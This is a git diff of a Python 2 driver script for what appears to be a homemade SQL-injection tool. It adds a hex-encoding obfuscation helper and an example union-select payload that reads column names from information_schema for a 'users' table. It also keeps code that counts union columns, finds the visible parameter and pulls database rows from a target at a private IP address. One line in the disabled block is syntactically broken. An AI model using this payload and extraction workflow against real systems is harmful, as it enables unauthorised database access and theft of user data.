@@ -15,6 +15,7 @@ import pprint
 import json
 
 def test_html_diff():
+    """ Debugging function """
 
     # Instantiate classes used
     scan = scanner.Scanner()
@@ -28,6 +29,16 @@ def test_html_diff():
     #b = scan.page('http://192.168.83.134/?id=null')
 
     print parse.html_diff(b, a)
+
+def obfuscate_subquery(obfuscator, obfuscation, subquery):
+    """ Takes subquery to obfuscate by encoding.
+        :obfuscator:    Obfuscator object.
+        :obfuscation:   Type of obfuscation to use. Ex, hex-encoding.
+        :subquery:      String. Part of query to encode.
+        :returns:       String. Encoded subquery.
+    """
+    
+    return obfuscator.by_encoding(subquery, obfuscation)
 
 if __name__ == '__main__':
 
@@ -49,17 +60,19 @@ if __name__ == '__main__':
     parse = parser.Parser(store)
     obfuscate = obfuscator.Obfuscator()
 
-
-    #print obfuscate.by_padding('XXXXX', '/**/')
-
     """
+    # Example obfuscation
+    hexencoded = '1 union select column_name,2 from information_schema.columns where table_name = (select'
+    hexencoded += obfuscate_subquery(obfuscate, 'hex', '\'users\'') + ')'
+    print hexencoded
+    """
+
     # Get column data for union statement
     print '\n### Basic Page Structure ###'
     num_columns = fang.get_num_columns() 
     report.columns_in_statement(num_columns)
     magic_num = int(fang.get_visible_param())
     print '\tMagic Param','\t', magic_num
-
 
     # Get DB params
     print '\n### Basic DB Info ###'
@@ -77,6 +90,7 @@ if __name__ == '__main__':
     report.columns(parse.columns(columns))
     columns = parse.columns(columns)
 
+    """
     # Get rows
     for column in columns:
         x = build.rows(num_columns, magic_num, , data)
@@ -85,6 +99,6 @@ if __name__ == '__main__':
     #print data
     #print parse.rows(data)
     #report.XXX(parse.XXX(data))
-    """  
+    """
 
 
